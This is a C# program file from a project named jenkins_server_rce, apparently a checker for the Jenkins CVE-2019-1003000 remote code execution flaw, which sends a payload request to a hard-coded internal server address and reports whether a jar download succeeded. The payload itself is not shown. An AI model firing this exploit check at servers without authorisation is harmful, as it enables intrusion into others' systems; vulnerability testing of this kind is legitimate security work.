using System;
using MatthiWare.CommandLine;
using jenkins_server_rce.commandlineargs;
using jenkins_server_rce.jenkinsrequests;
using System.Net.Http;

namespace jenkins_server_rce
{
    class Program
    { 

        static void Main(string[] args)
        {
            HttpClient client = new HttpClient();

            string otherTargetURL = "http://10.252.10.157:8080/securityRealm/user/admin/";
            string targetURL = "http://localhost:8080/securityRealm/user/admin/";

            CommandLineSetUp(args);

            var didJarDownload = jenkins_requests.SendPayloadInGETRequest(otherTargetURL, client);
            var isServerVulnerable = IsVulnerable(didJarDownload);
            Console.WriteLine($"Jenkins Server Vulnerable to CVE-2019-1003000: {isServerVulnerable}");

        }

        //Function Name: CommandLineSetup
        //Function Parameters => Return Type : Void => Void
        //Function Purpose: Will set up required arguments to pass in from terminal
        static void CommandLineSetUp(string[] arguments)
        {
            var options = new CommandLineParserOptions
            {
                AppName = "Detecting CVE-2019-1003000 RCE Bug"
            };
            var parser = new CommandLineParser<cli_args>(options);
            var result = parser.Parse(arguments);
            if (result.HasErrors)
            {
                Console.Error.WriteLine("Errors in command line arguments");
                return;
            }
            var programOptions = result.Result;

        }

        static bool IsVulnerable(string response)
        {
            if (response == "success")
            {
                return true;
            }
            else
            {
                return false;
            }
        }


    }
    
}
